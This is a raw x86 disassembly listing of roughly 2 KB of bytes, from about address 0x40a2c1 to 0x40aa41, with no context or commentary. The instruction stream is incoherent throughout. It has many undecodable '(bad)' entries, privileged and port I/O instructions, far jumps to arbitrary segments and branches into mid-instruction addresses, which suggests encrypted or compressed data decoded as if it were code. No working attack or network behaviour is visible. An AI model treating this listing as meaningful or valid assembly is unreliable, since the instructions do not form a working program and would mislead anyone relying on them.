  40a2c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2c2:	sub    BYTE PTR [edi+0x5c97ed41],ch
  40a2c8:	adc    bh,dh
  40a2ca:	(bad)  
  40a2cb:	dec    esp
  40a2cc:	mov    ebp,0xccfa0fec
  40a2d1:	inc    ebx
  40a2d2:	fwait
  40a2d3:	aam    0xe1
  40a2d5:	xchg   BYTE PTR [edi],dl
  40a2d7:	nop
  40a2d8:	(bad)  
  40a2da:	std    
  40a2db:	aas    
  40a2dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2dd:	cli    
  40a2de:	retf   0x40d0
  40a2e1:	sub    al,0x6a
  40a2e3:	xchg   edx,eax
  40a2e4:	add    eax,0x845310d1
  40a2e9:	dec    edi
  40a2ea:	jmp    0x40a2f9
  40a2ec:	add    cl,ah
  40a2ee:	jbe    0x40a293
  40a2f0:	or     bl,BYTE PTR [ecx-0x66495de2]
  40a2f6:	ja     0x40a357
  40a2f8:	fmul   QWORD PTR [ebx-0x5]
  40a2fb:	data16 clc 
  40a2fd:	pop    es
  40a2fe:	mov    eax,DWORD PTR [edx]
  40a300:	rcr    DWORD PTR [eax-0x22],1
  40a303:	lock dec edi
  40a305:	lods   eax,DWORD PTR ds:[esi]
  40a306:	imul   BYTE PTR [ebp-0x41e1e3b]
  40a30c:	cmp    bh,BYTE PTR [edi+0x28da1a93]
  40a312:	adc    al,0x3c
  40a314:	(bad)  [ebx+ecx*2-0x37]
  40a318:	sbb    BYTE PTR ds:0xd19a0aa0,dl
  40a31e:	adc    al,0xf2
  40a320:	mov    ah,0x61
  40a322:	adc    al,0xe2
  40a324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a325:	mov    WORD PTR [ebx],?
  40a327:	cmp    bl,dl
  40a329:	xchg   ecx,esi
  40a32b:	and    edx,DWORD PTR [esi]
  40a32d:	adc    BYTE PTR [esi+0x2893b963],ah
  40a333:	ja     0x40a2bb
  40a335:	jnp    0x40a2e0
  40a337:	fdivr  DWORD PTR [eax-0x7f]
  40a33a:	jl     0x40a2eb
  40a33c:	cdq    
  40a33d:	js     0x40a3b0
  40a33f:	lahf   
  40a340:	jmp    0x4fbd925e
  40a345:	mov    ebx,0xadd47170
  40a34a:	int3   
  40a34b:	xchg   esp,eax
  40a34c:	add    ebx,DWORD PTR [esi]
  40a34e:	mov    esi,0x8334b4c3
  40a353:	aad    0x3c
  40a355:	fisubr WORD PTR [eax-0x75]
  40a358:	mov    ds:0xd9eedc9a,al
  40a35d:	stos   DWORD PTR es:[edi],eax
  40a35e:	mov    ebp,0x2e39c9b6
  40a363:	lahf   
  40a364:	pop    ebp
  40a365:	shr    BYTE PTR [edi-0x10],cl
  40a368:	ret    0xbda5
  40a36b:	mov    dl,0x31
  40a36d:	adc    BYTE PTR [ecx+eiz*2-0x1033a2b],dl
  40a374:	adc    al,0xc7
  40a376:	nop
  40a377:	push   ds
  40a378:	mov    ds:0xa4ad7ce4,al
  40a37d:	cmc    
  40a37e:	inc    ecx
  40a37f:	fdivrp st(6),st
  40a381:	cwde   
  40a382:	jnp    0x40a32d
  40a384:	fwait
  40a385:	pop    esi
  40a386:	fiadd  WORD PTR [edx+0x3]
  40a389:	ds leavew 
  40a38c:	inc    esp
  40a38d:	ins    BYTE PTR es:[edi],dx
  40a38e:	outs   dx,BYTE PTR ds:[esi]
  40a38f:	jbe    0x40a3e3
  40a391:	pop    ds
  40a392:	or     al,0x9
  40a394:	pop    edi
  40a395:	push   ebx
  40a396:	leave  
  40a397:	ret    0x33ce
  40a39a:	outs   dx,BYTE PTR ds:[esi]
  40a39b:	gs mov ebp,0xc9eb7bbe
  40a3a1:	inc    edx
  40a3a2:	aam    0xd9
  40a3a4:	xchg   ch,ch
  40a3a6:	repz or DWORD PTR [edi-0x146bc95b],esi
  40a3ad:	shl    BYTE PTR [edi+esi*1-0x2f221bef],0xb2
  40a3b5:	in     eax,0xb9
  40a3b7:	pop    esp
  40a3b8:	add    eax,0x99469ca5
  40a3bd:	fnsave ds:0x7bc75a2d
  40a3c3:	push   ebx
  40a3c4:	fldcw  WORD PTR [ebx+0x56]
  40a3c7:	jmp    0x9f56:0xdbbeb230
  40a3ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3cf:	out    dx,eax
  40a3d0:	xchg   ecx,eax
  40a3d1:	faddp  st(7),st
  40a3d3:	gs (bad) 
  40a3d5:	addr16 jno 0x40a3c7
  40a3d8:	jae    0x40a3b6
  40a3da:	shl    BYTE PTR [ecx+0x44],cl
  40a3dd:	and    ch,BYTE PTR [eax+0x29048a80]
  40a3e3:	and    eax,DWORD PTR [ebx+0x6a]
  40a3e6:	pop    ecx
  40a3e7:	fs call 0x5c86:0x664f6734
  40a3ef:	aad    0x32
  40a3f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3f2:	cld    
  40a3f3:	xor    DWORD PTR [ebp+0x75],0xfffffff2
  40a3f7:	mov    BYTE PTR [eax+0x6d7a9233],bl
  40a3fd:	bound  edi,QWORD PTR [ebx-0x55]
  40a400:	es dec esp
  40a402:	jg     0x40a3c2
  40a404:	adc    esp,0x5b74d73f
  40a40a:	xor    al,BYTE PTR [edx]
  40a40c:	push   eax
  40a40d:	paddd  mm2,QWORD PTR cs:[edx-0x9858140]
  40a415:	pop    es
  40a416:	pop    edi
  40a417:	mov    ds:0x7b389fcc,eax
  40a41c:	pop    ebp
  40a41d:	pusha  
  40a41e:	shl    BYTE PTR [edi+0x54],cl
  40a421:	adc    eax,0x33a5f780
  40a426:	jno    0x40a494
  40a428:	sub    al,0x82
  40a42a:	enter  0xef58,0xa7
  40a42e:	shr    BYTE PTR [edi+0x21694177],1
  40a434:	popa   
  40a435:	mov    al,0xb7
  40a437:	ins    DWORD PTR es:[edi],dx
  40a438:	mov    dh,0x48
  40a43a:	call   0x23ba:0xd6c7da0b
  40a441:	or     esp,ecx
  40a443:	pop    ss
  40a444:	icebp  
  40a445:	xor    esp,esp
  40a447:	pop    edx
  40a448:	mov    ah,ch
  40a44a:	push   ebx
  40a44b:	jb     0x40a42e
  40a44d:	jb     0x40a46f
  40a44f:	ret    0x5fa3
  40a452:	inc    ebp
  40a453:	iret   
  40a454:	dec    ecx
  40a455:	and    ah,bh
  40a457:	scas   eax,DWORD PTR es:[edi]
  40a458:	les    edi,FWORD PTR [esi+ebx*1+0x53]
  40a45c:	in     eax,0x1f
  40a45e:	mov    ds:0x8300467b,eax
  40a463:	mov    es,WORD PTR [ebx+0x61]
  40a466:	je     0x40a471
  40a468:	xor    ebp,ecx
  40a46a:	mov    ch,0x8b
  40a46c:	mov    WORD PTR ds:0x1c7c2c85,es
  40a472:	(bad)  
  40a473:	or     BYTE PTR [ebp-0x13],ch
  40a476:	jmp    0x47108db0
  40a47b:	mov    dl,0xd5
  40a47d:	jp     0x40a4c1
  40a47f:	xor    esp,eax
  40a481:	pop    ebp
  40a482:	ins    DWORD PTR es:[edi],dx
  40a483:	dec    esi
  40a484:	test   DWORD PTR ss:[eax],ebp
  40a487:	jmp    0x24c6:0x8016b900
  40a48e:	call   edi
  40a490:	cmp    dh,al
  40a492:	xor    ecx,0xffffffff
  40a495:	aam    0xa4
  40a497:	dec    ebp
  40a498:	ret    
  40a499:	jo     0x40a482
  40a49b:	jl     0x40a503
  40a49d:	or     cl,BYTE PTR [ebp+0x4]
  40a4a0:	or     BYTE PTR [esi+0x3d569333],ah
  40a4a6:	arpl   WORD PTR [ebp+esi*8-0x63],sp
  40a4aa:	sub    eax,0x80b61537
  40a4af:	fcomp  DWORD PTR [ebx+ebx*2+0x4c]
  40a4b3:	cdq    
  40a4b4:	jmp    0x40a45e
  40a4b6:	xchg   esp,ebx
  40a4b8:	cmp    edx,edx
  40a4ba:	cs add al,0x1f
  40a4bd:	outs   dx,BYTE PTR ds:[esi]
  40a4be:	or     eax,0x1e40bbe9
  40a4c3:	mov    ?,WORD PTR [edi-0x561ce8de]
  40a4c9:	mov    eax,ds:0x1ac34625
  40a4ce:	dec    edi
  40a4cf:	push   ebp
  40a4d0:	fsubr  st(4),st
  40a4d2:	sub    edi,0xffffff82
  40a4d5:	ins    BYTE PTR es:[edi],dx
  40a4d6:	sbb    eax,0xad1c9b31
  40a4db:	ret    0x9179
  40a4de:	and    bh,BYTE PTR [edx]
  40a4e0:	inc    esp
  40a4e1:	mov    cs,WORD PTR [ebp-0x21]
  40a4e4:	or     DWORD PTR [esi-0x38067fdc],eax
  40a4ea:	jmp    0x73ff:0xe320d685
  40a4f1:	shl    DWORD PTR [eax+0x61ef3289],cl
  40a4f7:	in     al,0xa7
  40a4f9:	adc    cl,BYTE PTR [esi+edi*8+0xb]
  40a4fd:	mov    dh,0x9
  40a4ff:	mov    eax,0xcc205d80
  40a504:	push   ebx
  40a505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a506:	and    DWORD PTR [edi+edi*8+0x49],eax
  40a50a:	sub    eax,0xcb7ed028
  40a50f:	mov    WORD PTR [eax-0x3901323a],fs
  40a515:	sub    al,0x87
  40a517:	popa   
  40a518:	mov    ch,0x0
  40a51a:	mov    ebp,esp
  40a51c:	repnz cmp eax,0x2d2cf5d0
  40a522:	push   edx
  40a523:	xor    DWORD PTR [esi],esp
  40a525:	punpcklbw mm7,mm3
  40a528:	mov    edx,esp
  40a52a:	jmp    0x35da9f81
  40a52f:	xor    DWORD PTR [ebp+0x7ba357d],eax
  40a535:	in     al,dx
  40a536:	inc    DWORD PTR [edx+0x16ecb910]
  40a53c:	sbb    al,0xd4
  40a53e:	push   edi
  40a53f:	pusha  
  40a540:	in     al,dx
  40a541:	dec    esp
  40a542:	inc    edx
  40a543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a544:	xor    BYTE PTR [ebp+0x4b],dh
  40a547:	repz fnstsw WORD PTR [edx-0x7111a8b9]
  40a54e:	sbb    ch,bh
  40a550:	push   edi
  40a551:	out    0x1a,al
  40a553:	pusha  
  40a554:	and    eax,DWORD PTR [edx]
  40a556:	pop    ebx
  40a557:	dec    ecx
  40a558:	ret    
  40a559:	(bad)  [edx+ebx*1]
  40a55c:	(bad)  
  40a55d:	repnz lea edi,[ebx-0x48761cc1]
  40a564:	push   eax
  40a565:	jl     0x40a569
  40a567:	pop    ebx
  40a568:	call   0x9edeb5e9
  40a56d:	mov    WORD PTR [edi-0x78d75106],cs
  40a573:	mov    esp,0xc32dada6
  40a578:	xchg   esp,eax
  40a579:	and    DWORD PTR [ebp+0x22],ebx
  40a57c:	fs push eax
  40a57e:	retf   0x51b4
  40a581:	sbb    bl,dl
  40a583:	add    ch,BYTE PTR [edx+ecx*1-0x1c]
  40a587:	mov    cr0,edx
  40a58a:	push   ecx
  40a58b:	mov    ds:0xb3c088a5,al
  40a590:	lahf   
  40a591:	ret    0x3987
  40a594:	dec    ebx
  40a595:	push   es
  40a596:	xlat   BYTE PTR ds:[ebx]
  40a597:	adc    bh,BYTE PTR [edi]
  40a599:	cmp    BYTE PTR [ebp-0x7a],0x38
  40a59d:	mov    ch,0x2a
  40a59f:	mov    dl,0x44
  40a5a1:	inc    esp
  40a5a2:	mov    al,0x89
  40a5a4:	lahf   
  40a5a5:	push   edx
  40a5a6:	jl     0x40a58a
  40a5a8:	test   ecx,0xf340d90f
  40a5ae:	mov    esi,0x2c3e600
  40a5b3:	sbb    al,0xa4
  40a5b5:	or     eax,0x604f2d21
  40a5ba:	mov    ah,0x77
  40a5bc:	sub    al,0xce
  40a5be:	les    esp,FWORD PTR [ebx+0x511577b7]
  40a5c4:	mov    dh,ah
  40a5c6:	inc    ebx
  40a5c7:	mov    edi,DWORD PTR [esi-0x48a93a5c]
  40a5cd:	mov    ah,0xe0
  40a5cf:	xor    edi,esp
  40a5d1:	pop    ecx
  40a5d2:	(bad)
  40a5d5:	ret    0x904b
  40a5d8:	out    dx,al
  40a5d9:	xor    ebp,DWORD PTR [bp+di+0x6b03]
  40a5de:	push   edi
  40a5df:	sub    DWORD PTR [edx-0x55d4f554],0x9843214b
  40a5e9:	or     BYTE PTR [esi],bl
  40a5eb:	inc    edx
  40a5ec:	dec    edx
  40a5ed:	test   esp,ebp
  40a5ef:	sar    DWORD PTR [esi],0xfa
  40a5f2:	aam    0x60
  40a5f4:	xchg   esi,eax
  40a5f5:	mov    eax,0xcfdd58bd
  40a5fa:	ret    
  40a5fb:	cld    
  40a5fc:	sub    esi,DWORD PTR es:[ebp+0x6c616c88]
  40a603:	inc    ebx
  40a604:	sub    al,0xd4
  40a606:	jmp    0x40a67d
  40a608:	fdiv   st(4),st
  40a60a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a60b:	pushf  
  40a60c:	pop    edi
  40a60d:	pop    ecx
  40a60e:	jbe    0x40a5d3
  40a610:	jle    0x40a5c4
  40a612:	mov    ds:0x443cd6c,eax
  40a618:	mov    dl,0x53
  40a61a:	rcr    BYTE PTR [ecx+0x55],cl
  40a61d:	xor    BYTE PTR [edi+ecx*4],0x22
  40a621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a622:	push   edx
  40a623:	mov    eax,ds:0x76bf1e96
  40a628:	pop    edi
  40a629:	sar    BYTE PTR [ebx-0x15],0xd1
  40a62d:	adc    bh,BYTE PTR [ecx+0x2a587b9]
  40a633:	fild   WORD PTR [edi-0x7b6b203d]
  40a639:	pop    es
  40a63a:	sub    BYTE PTR [esi],bh
  40a63c:	lods   eax,DWORD PTR ds:[esi]
  40a63d:	ss leave 
  40a63f:	int3   
  40a640:	dec    ebp
  40a641:	sub    cl,al
  40a643:	mov    ah,0xe6
  40a645:	cmp    BYTE PTR [eax+ecx*2-0x647998a6],bh
  40a64c:	cmp    ah,dh
  40a64e:	or     bl,BYTE PTR [edx-0x63b542f0]
  40a654:	and    al,0x6e
  40a656:	cmp    ebx,DWORD PTR [edi+0x7a846309]
  40a65c:	dec    edx
  40a65d:	or     eax,0x67f09a2d
  40a662:	push   ds
  40a663:	sbb    eax,0x8899d6ee
  40a668:	inc    eax
  40a669:	std    
  40a66a:	mov    ebx,0xd6e82b5d
  40a66f:	push   ebx
  40a670:	fsubr  st(1),st
  40a672:	(bad)  
  40a674:	mov    dh,0xc0
  40a676:	mov    ecx,0x441292bb
  40a67b:	inc    esp
  40a67c:	ds sti 
  40a67e:	aad    0xba
  40a680:	sub    eax,0xd0adebd7
  40a685:	jecxz  0x40a6ef
  40a687:	iret   
  40a688:	inc    ebp
  40a689:	and    al,0xf5
  40a68b:	pop    ds
  40a68c:	sbb    DWORD PTR [edi-0x45],ebp
  40a68f:	xor    BYTE PTR [ebx],0xb9
  40a692:	xlat   BYTE PTR ds:[ebx]
  40a693:	add    eax,0x19b1013
  40a698:	or     eax,0xc8d757a9
  40a69d:	inc    ebx
  40a69e:	pand   mm3,QWORD PTR [ecx-0x17]
  40a6a2:	adc    DWORD PTR ds:0xa856cf66,edi
  40a6a8:	dec    ebx
  40a6a9:	loopne 0x40a64e
  40a6ab:	icebp  
  40a6ac:	out    0x3e,eax
  40a6ae:	fwait
  40a6af:	rcl    DWORD PTR [ecx-0xe],0x87
  40a6b3:	adc    dl,ch
  40a6b5:	mov    DWORD PTR [ebx],ebp
  40a6b7:	jne    0x40a677
  40a6b9:	scas   al,BYTE PTR es:[edi]
  40a6ba:	xor    eax,0xd4a6028c
  40a6bf:	test   eax,0x19a82f81
  40a6c4:	das    
  40a6c5:	mov    dh,0x6f
  40a6c7:	test   edx,esi
  40a6c9:	std    
  40a6ca:	inc    ecx
  40a6cb:	ins    DWORD PTR es:[edi],dx
  40a6cc:	mov    esi,0x57302bf9
  40a6d1:	pop    ecx
  40a6d2:	add    esi,esi
  40a6d4:	std    
  40a6d5:	adc    eax,0x996df5a
  40a6da:	sub    ah,BYTE PTR [ecx]
  40a6dc:	stc    
  40a6dd:	dec    ebp
  40a6de:	mov    dl,0x4
  40a6e0:	sub    dl,dl
  40a6e2:	aaa    
  40a6e3:	(bad)  
  40a6e4:	mov    cs,WORD PTR [esi-0x6fb0d39e]
  40a6ea:	mov    ebx,0xc4a85cb3
  40a6ef:	adc    al,al
  40a6f1:	popw   ss
  40a6f3:	pop    ecx
  40a6f4:	call   0xcdc:0xb084a7e
  40a6fb:	(bad)  
  40a6fc:	mov    ebp,0x6fa1c276
  40a701:	cmp    bl,BYTE PTR [eax+0x648589d3]
  40a707:	xor    eax,0x4c14d910
  40a70c:	loopne 0x40a69c
  40a70e:	fcomp  DWORD PTR [ebp-0x18287f55]
  40a714:	es int3 
  40a716:	mov    esp,edi
  40a718:	push   eax
  40a719:	dec    esp
  40a71a:	dec    ecx
  40a71b:	pop    eax
  40a71c:	sahf   
  40a71d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a71e:	int    0x10
  40a720:	or     ecx,esi
  40a722:	into   
  40a723:	shr    DWORD PTR [edi-0x20],1
  40a726:	push   ebp
  40a727:	test   al,0x6c
  40a729:	rcr    DWORD PTR [edx],1
  40a72b:	test   al,0x57
  40a72d:	dec    edi
  40a72e:	mov    bh,0xc
  40a730:	lods   eax,DWORD PTR ds:[esi]
  40a731:	lods   al,BYTE PTR ds:[esi]
  40a732:	sar    ecx,1
  40a734:	inc    ecx
  40a735:	aam    0x55
  40a737:	lods   eax,DWORD PTR ds:[esi]
  40a738:	push   eax
  40a739:	pop    es
  40a73a:	sbb    edx,DWORD PTR [edx]
  40a73c:	pop    ds
  40a73d:	dec    ecx
  40a73e:	call   FWORD PTR [eax]
  40a740:	pop    ss
  40a741:	(bad)  
  40a742:	(bad)  
  40a743:	xor    al,0x78
  40a745:	add    eax,0xff19f68f
  40a74a:	ins    DWORD PTR es:[edi],dx
  40a74b:	(bad)  
  40a74d:	mov    ch,al
  40a74f:	mov    bh,0xc9
  40a751:	and    eax,0x80de4fd4
  40a756:	mov    ss,edi
  40a758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a759:	in     eax,dx
  40a75a:	inc    eax
  40a75b:	out    0x18,eax
  40a75d:	in     eax,dx
  40a75e:	rcl    BYTE PTR [eax-0x21],cl
  40a761:	out    dx,eax
  40a762:	enter  0x6f82,0xe7
  40a766:	and    al,0xdc
  40a768:	out    0xd5,eax
  40a76a:	out    0xf7,eax
  40a76c:	pop    ds
  40a76d:	fdivr  QWORD PTR [ebx+0x100b069e]
  40a773:	or     dl,0x6b
  40a776:	jecxz  0x40a7d2
  40a778:	dec    ecx
  40a779:	stos   DWORD PTR es:[edi],eax
  40a77a:	outs   dx,BYTE PTR ds:[esi]
  40a77b:	push   ss
  40a77c:	mov    ch,0x69
  40a77e:	ins    BYTE PTR es:[edi],dx
  40a77f:	inc    edx
  40a780:	aad    0xd3
  40a782:	mov    eax,ds:0x3f345a3c
  40a787:	add    BYTE PTR [edx+0x1f],bl
  40a78a:	dec    eax
  40a78b:	jmp    eax
  40a78d:	lea    ebp,[ebx+esi*2]
  40a790:	jecxz  0x40a733
  40a792:	scas   eax,DWORD PTR es:[edi]
  40a793:	das    
  40a794:	in     eax,0xf7
  40a796:	into   
  40a797:	retf   0x106b
  40a79a:	sar    DWORD PTR [ebp-0x57],1
  40a79d:	call   0x9b18065
  40a7a2:	sbb    dl,BYTE PTR [edi]
  40a7a4:	adc    al,0xbf
  40a7a6:	hlt    
  40a7a7:	int    0xfe
  40a7a9:	sub    eax,0x60d18d88
  40a7ae:	add    DWORD PTR [eax],edx
  40a7b0:	add    DWORD PTR [edi+0x3076d81d],ebx
  40a7b6:	pop    esp
  40a7b7:	lock lods al,BYTE PTR ds:[esi]
  40a7b9:	out    0xff,al
  40a7bb:	out    dx,al
  40a7bc:	cmc    
  40a7bd:	xor    al,0x1c
  40a7bf:	test   ch,bh
  40a7c1:	(bad)  
  40a7c2:	jo     0x40a78d
  40a7c4:	and    cl,BYTE PTR [esi-0x71]
  40a7c7:	mov    cs,ebx
  40a7c9:	add    esi,DWORD PTR [edx]
  40a7cb:	aad    0xb3
  40a7cd:	lahf   
  40a7ce:	pop    eax
  40a7cf:	test   eax,0xa4f923ec
  40a7d4:	cmp    eax,DWORD PTR [edx+0x58af5b3d]
  40a7da:	out    dx,eax
  40a7db:	mov    esi,0x46be34a3
  40a7e0:	xor    eax,0xcce2fc68
  40a7e5:	and    BYTE PTR [ebx],dh
  40a7e7:	scas   al,BYTE PTR es:[edi]
  40a7e8:	push   ebx
  40a7e9:	or     BYTE PTR [ebx-0x36],al
  40a7ec:	dec    eax
  40a7ed:	popa   
  40a7ee:	sub    eax,0x9e5f6fee
  40a7f3:	lahf   
  40a7f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7f5:	cmp    cl,dl
  40a7f7:	sub    DWORD PTR [eax+edx*8+0x49],edi
  40a7fb:	jmp    0x40a82b
  40a7fd:	jmp    0x40a7a6
  40a7ff:	lods   al,BYTE PTR ds:[esi]
  40a800:	fild   QWORD PTR [edi+ecx*2-0x1d5453aa]
  40a807:	in     eax,dx
  40a808:	lods   al,BYTE PTR ds:[esi]
  40a809:	or     DWORD PTR [esi-0x60dcdbf5],edx
  40a80f:	sub    al,ah
  40a811:	es jmp 0x40a86b
  40a814:	push   eax
  40a815:	sub    eax,0xdd3cced3
  40a81a:	imul   BYTE PTR [eax+0x6f5544fc]
  40a820:	or     DWORD PTR [edi-0x54d20f2b],edx
  40a826:	fs mov ebp,0xe7a1012b
  40a82c:	lock jae 0x40a7e8
  40a82f:	clc    
  40a830:	sbb    eax,0x46158cd7
  40a835:	rcr    DWORD PTR [ecx-0x505cb9a9],cl
  40a83b:	mov    fs,WORD PTR [eax]
  40a83d:	lods   al,BYTE PTR ds:[esi]
  40a83e:	and    al,0xe4
  40a840:	mov    edx,0x39bfcde9
  40a845:	imul   ecx,ebx,0xc8d1ae04
  40a84b:	jl     0x40a7d0
  40a84d:	in     al,dx
  40a84e:	sub    bl,cl
  40a850:	fs push eax
  40a852:	mov    eax,ds:0x794adfc6
  40a857:	repnz retf 0x7b51
  40a85b:	hlt    
  40a85c:	pop    edx
  40a85d:	imul   eax,ebx,0x21b34ffc
  40a863:	xor    al,0xc1
  40a865:	dec    edx
  40a866:	xchg   esp,eax
  40a867:	pusha  
  40a868:	jle    0x40a8dd
  40a86a:	fistp  DWORD PTR [edi+0xa]
  40a86d:	sbb    ebx,DWORD PTR [edx+0x155dadb]
  40a873:	add    BYTE PTR [esp+eax*2+0x2a],cl
  40a877:	jno    0x40a8d3
  40a879:	inc    esi
  40a87a:	jns    0x40a843
  40a87c:	xchg   edx,eax
  40a87d:	pop    edx
  40a87e:	loop   0x40a839
  40a880:	mov    esp,0x6c9a8632
  40a885:	mov    esi,0xf630224b
  40a88a:	ror    DWORD PTR [ebp-0x4a],0xd
  40a88e:	push   ds
  40a88f:	sub    DWORD PTR [eax-0x54],0xcba30e7b
  40a896:	mov    eax,0x71b42d28
  40a89b:	dec    ebx
  40a89c:	xchg   esi,eax
  40a89d:	sbb    esi,esi
  40a89f:	test   al,0x25
  40a8a1:	fcmovnb st,st(1)
  40a8a3:	mov    al,ds:0x131a3525
  40a8a8:	and    ebx,esp
  40a8aa:	les    esp,FWORD PTR [ebx+0x555e83f6]
  40a8b0:	mov    edx,0x672c3494
  40a8b5:	lea    esi,[ebp+0x630a7db0]
  40a8bb:	imul   bl
  40a8bd:	jmp    FWORD PTR [eax+0x3a776022]
  40a8c3:	push   cs
  40a8c4:	jp     0x40a911
  40a8c6:	fbstp  TBYTE PTR [edi+0x79]
  40a8c9:	cs jecxz 0x40a851
  40a8cc:	cmp    DWORD PTR [ebp-0x62],eax
  40a8cf:	push   eax
  40a8d0:	push   0xb2397c41
  40a8d5:	retf   
  40a8d6:	stc    
  40a8d7:	(bad)  
  40a8d8:	push   0x53
  40a8da:	ins    DWORD PTR es:[edi],dx
  40a8db:	sub    ecx,DWORD PTR [ebp+0x2a]
  40a8de:	sbb    edi,DWORD PTR [edi+0xd]
  40a8e1:	lea    ebp,[esi-0x8]
  40a8e4:	cmc    
  40a8e5:	and    eax,0xc952c7a4
  40a8ea:	popf   
  40a8eb:	lock (bad) 
  40a8ed:	lods   eax,DWORD PTR ds:[esi]
  40a8ee:	call   0xe97c7e8d
  40a8f3:	push   ds
  40a8f4:	sub    cl,BYTE PTR ds:0xcb023ad4
  40a8fa:	daa    
  40a8fb:	jl     0x40a8bc
  40a8fd:	shl    DWORD PTR [ebp-0x1206c398],cl
  40a903:	dec    ebp
  40a904:	je     0x40a97b
  40a906:	jge    0x40a96b
  40a908:	xor    al,0x3a
  40a90a:	xlat   BYTE PTR ds:[ebx]
  40a90b:	inc    edi
  40a90c:	test   BYTE PTR [ecx-0x154477b8],0xbc
  40a913:	inc    esi
  40a914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a915:	pop    es
  40a916:	xor    al,0x31
  40a918:	fwait
  40a919:	sub    eax,0x4d4a38a6
  40a91e:	(bad)  
  40a91f:	hlt    
  40a920:	dec    ebp
  40a921:	and    BYTE PTR ds:0x4ac81401,bl
  40a927:	adc    eax,0x4f6d6d9c
  40a92c:	std    
  40a92d:	xchg   esi,eax
  40a92e:	loop   0x40a94e
  40a930:	add    ebx,DWORD PTR [bx+si]
  40a933:	or     BYTE PTR [eax+0x79],bh
  40a936:	push   0xffffffd2
  40a938:	js     0x40a994
  40a93a:	dec    edi
  40a93b:	rcl    BYTE PTR [ebx-0x3b85abfe],0x8a
  40a942:	push   edi
  40a943:	lods   al,BYTE PTR ds:[esi]
  40a944:	fisubr WORD PTR [ebx+0x50]
  40a947:	test   BYTE PTR [edi+0x7df1b793],0x16
  40a94e:	jg     0x40a8f9
  40a950:	and    al,0x29
  40a952:	sub    BYTE PTR [ebx+0x1d592c6],dh
  40a958:	aad    0xe
  40a95a:	out    0x22,eax
  40a95c:	ins    BYTE PTR es:[edi],dx
  40a95d:	lea    esi,[edx-0xd]
  40a960:	test   DWORD PTR [eax-0x14d751c2],edi
  40a966:	(bad)  
  40a967:	jg     0x40a931
  40a969:	fdivp  st(1),st
  40a96b:	add    ebp,DWORD PTR [ebx+edi*2+0x26]
  40a96f:	adc    DWORD PTR [edi],ebx
  40a971:	bswap  ebp
  40a973:	leave  
  40a974:	pop    eax
  40a975:	outs   dx,BYTE PTR ds:[esi]
  40a976:	ins    DWORD PTR es:[edi],dx
  40a977:	jp     0x40a9b1
  40a979:	mov    dl,dl
  40a97b:	dec    esp
  40a97c:	outs   dx,DWORD PTR ds:[esi]
  40a97d:	dec    edx
  40a97e:	icebp  
  40a97f:	pop    ebx
  40a980:	xor    edi,eax
  40a982:	mov    al,0x33
  40a984:	xlat   BYTE PTR ds:[ebx]
  40a985:	fidivr DWORD PTR [ecx+0x3c]
  40a988:	cmp    dl,BYTE PTR [edi+0xdfe0ac6]
  40a98e:	je     0x40a947
  40a990:	cdq    
  40a991:	push   ebx
  40a992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a993:	inc    ebx
  40a994:	fwait
  40a995:	loopne 0x40a99e
  40a997:	inc    ebp
  40a998:	dec    ebx
  40a999:	adc    bh,cl
  40a99b:	inc    esp
  40a99c:	fst    DWORD PTR [edx]
  40a99e:	mov    ah,0xce
  40a9a0:	das    
  40a9a1:	jmp    0x5908:0x8ba291
  40a9a8:	out    0xb8,al
  40a9aa:	rcl    BYTE PTR [edi+0x5c93d587],1
  40a9b0:	xor    ah,BYTE PTR [ebp+0x21c9e20c]
  40a9b6:	nop
  40a9b7:	mov    eax,0x3331eb80
  40a9bc:	add    ebx,DWORD PTR [edx-0x42]
  40a9bf:	aaa    
  40a9c0:	popa   
  40a9c1:	inc    edx
  40a9c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9c3:	shl    BYTE PTR [ecx+0x68d4bd24],1
  40a9c9:	mov    ebp,0xc7fd8dff
  40a9ce:	fcomp  QWORD PTR [ebp-0x4dfb6467]
  40a9d4:	std    
  40a9d5:	js     0x40a9ef
  40a9d7:	adc    ebx,edx
  40a9d9:	push   eax
  40a9da:	jns    0x40a973
  40a9dc:	add    al,0x3e
  40a9de:	int3   
  40a9df:	add    al,0x74
  40a9e1:	and    al,dl
  40a9e3:	mov    WORD PTR [esi],gs
  40a9e5:	adc    eax,0x6137b7a0
  40a9ea:	es pop ss
  40a9ec:	dec    edx
  40a9ed:	xchg   ebx,eax
  40a9ee:	gs push 0x37
  40a9f1:	and    BYTE PTR [edx],al
  40a9f3:	jge    0x40aa16
  40a9f5:	shr    al,1
  40a9f7:	ficomp WORD PTR [edx]
  40a9f9:	mov    ds:0x51916e3c,al
  40a9fe:	ds lahf 
  40aa00:	rol    dl,1
  40aa02:	fxch   st(7)
  40aa04:	out    dx,eax
  40aa05:	or     DWORD PTR [ecx-0x39],esp
  40aa08:	retf   0x399c
  40aa0b:	jp     0x40aa7b
  40aa0d:	dec    ebx
  40aa0e:	inc    ebp
  40aa0f:	loop   0x40a9b0
  40aa11:	adc    eax,0x7068dc84
  40aa16:	rcr    ah,0x88
  40aa19:	sub    eax,0xab46417a
  40aa1e:	popf   
  40aa1f:	imul   edx,DWORD PTR [ebp+ebx*1-0x5459fd5b],0x6c
  40aa27:	lock ja 0x40aa40
  40aa2a:	pop    es
  40aa2b:	scas   al,BYTE PTR es:[edi]
  40aa2c:	aaa    
  40aa2d:	int    0x9f
  40aa2f:	xor    DWORD PTR [ebx+0x37],eax
  40aa32:	pop    eax
  40aa33:	in     eax,0x46
  40aa35:	mov    ds:0xcd2bbc6e,al
  40aa3a:	mov    ebx,0xd549e235
  40aa3f:	pop    esi
  40aa40:	lods   eax,DWORD PTR ds:[esi]
  40aa41:	push   ecx
